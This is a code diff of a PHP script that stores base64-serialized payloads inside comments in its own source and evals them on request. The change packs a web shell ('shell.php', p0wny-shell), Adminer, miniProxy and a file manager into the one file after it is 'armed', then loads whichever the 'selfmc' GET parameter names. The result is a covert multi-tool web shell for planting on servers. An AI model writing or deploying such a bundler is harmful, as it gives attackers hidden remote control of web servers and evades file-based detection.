@@ -1,4 +1,3 @@
-<pre>
 <?php
 Class SMC {
 
@@ -48,41 +47,57 @@ Class SMC {
     $base64Encoded = base64_encode(serialize($object));
 
     // "I know, I'll use regular expressions."  
-    $this->fileData =  preg_replace("/(\/\*".$this->tag.")(.*)(\*\/)/", '$1'.$base64Encoded.'$3', $this->fileData);
+    $this->fileData =  preg_replace("/(\/\*".$this->tag.")(.*)(\*\/)/", 
+                                    '$1'.$base64Encoded.'$3', 
+                                    $this->fileData);
     file_put_contents(__FILE__, $this->fileData);
   }
 
 
 }
 
-$fileA = new SMC("fileA");
-if( $fileA->getData() ) {
-  echo "File A loaded<br>";
-} else {
-  echo "No file A writing...<br>";
-  $fileA->write( file_get_contents("alpha.txt") );
+
+// Some nice projects
+// https://www.adminer.org/
+// https://github.com/joshdick/miniProx
+// https://github.com/flozz/p0wny-shelly 
+// https://github.com/prasathmani/tinyfilemanager 
+$filenames = array("adminer.php",         
+                   "miniProxy.php",      
+                   "shell.php",          
+                   "tinyfilemanager.php" 
+                 );
+$files = array();
+
+// Run this once locally to "arm" the file
+foreach( $filenames as $filename ) {
+  $newFile = new SMC($filename);
+  if( ! $newFile->getData() ) {
+    $newFile->write( file_get_contents($filename) );
+  }
+  $files[] = $newFile;
 }
 
-$fileB = new SMC("fileB");
-if( $fileB->getData() ) {
-  echo "File B loaded<br>";
-} else {
-  echo "No file B writing...<br>";
-  $fileB->write( file_get_contents("beta.txt") );
+// currentFile keeps track of which file should be loaded
+$currentFile = new SMC("cf");
+if( isset($_GET['selfmc']) ) {
+  $currentFile->write($_GET['selfmc']);
+  header("Location: " . $_SERVER['PHP_SELF']);
+  die();
 }
-echo "<hr>";
 
 
+foreach( $files as $file ) {
+  if( $currentFile->getData() == $file->tag ) {
+    eval(' ?>' .  $file->getData()   );
+  }
+} 
 
 
-?>
-<a href="?A=1">Open A</a> | <a href="?B=1">Open B</a>
-<hr>
-<?php
-if( isset($_GET['A']) ) {
-  echo $fileA->getData();
-}
-if( isset($_GET['B']) ) {
-  echo $fileB->getData();
+// If the eval'd file plays nice we might get here. 
+// Worst case the user will have to change the GET selfmc variable manually.
+echo '<hr>';
+foreach( $filenames as $filename ) {
+  echo '<a href="?selfmc='.$filename.'">'.$filename.'</a> | ';
 }
 ?>
